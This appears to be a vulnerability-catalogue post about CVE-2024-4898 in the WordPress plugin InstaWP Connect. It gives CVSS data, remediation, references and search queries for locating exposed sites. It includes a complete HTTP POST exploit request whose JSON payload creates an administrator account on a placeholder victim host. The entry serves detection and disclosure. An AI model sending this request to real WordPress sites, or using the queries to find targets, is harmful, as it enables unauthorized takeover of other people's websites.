---
layout: post
cve_id: CVE-2024-4898
title: WordPress InstaWP Connect <= 0.1.0.38 - Unauthenticated User Creation
pcap: true
pcap_path: /pcaps/2024/CVE-2024-4898.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-4898.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Sourabh-Sahu
severity: critical
impact: 'Unauthenticated attackers can create administrator accounts and modify site
  options, leading to complete site takeover.

  '
remediation: 'Update InstaWP Connect to version 0.1.0.39 or later, which patches this
  vulnerability.

  '
reference:
- https://www.wordfence.com/threat-intel/vulnerabilities/id/92a00fb4-7b50-43fd-ac04-5d6e29336e9c?source=cve
- https://plugins.trac.wordpress.org/browser/instawp-connect/tags/0.1.0.38/includes/class-instawp-rest-api.php#L926
- https://nvd.nist.gov/vuln/detail/CVE-2024-4898
- https://github.com/truonghuuphuc/CVE-2024-4898-Poc
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-4898
  cwe-id: CWE-862
  epss-score: 0.88481
  epss-percentile: 0.99475
  cpe: cpe:2.3:a:instawp:instawp_connect:*:*:*:*:*:wordpress:*:*
metadata:
  vendor: instawp
  product: instawp_connect
  framework: wordpress
  publicwww-query: /wp-content/plugins/instawp-connect/
  fofa-query: body="/wp-content/plugins/instawp-connect/"
tags:
- cve
- cve2024
- wp
- wp-plugin
- wordpress
- instawp
- intrusive
- priv-esc
- vkev
- vuln
---

## ðŸ” Vulnerability Description
The InstaWP Connect â€“ 1-click WP Staging & Migration plugin for WordPress is vulnerable to arbitrary option updates due to a missing authorization checks on the REST API calls in all versions up to, and including, 0.1.0.38. This makes it possible for unauthenticated attackers to connect the site to InstaWP API, edit arbitrary site options and create administrator accounts.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-json/instawp-connect/v1/config HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)
Connection: close
Content-Length: 192
Content-Type: application/json
Accept-Encoding: gzip
{
"api_key": "hIo34WgBumqt",
"wp": {
"users": [
{
"username": "zrkKPb",
"email": "HvdUeq@ZXbPQ.com",
"password": "q3bLC8yx"
}
]
}
}
```

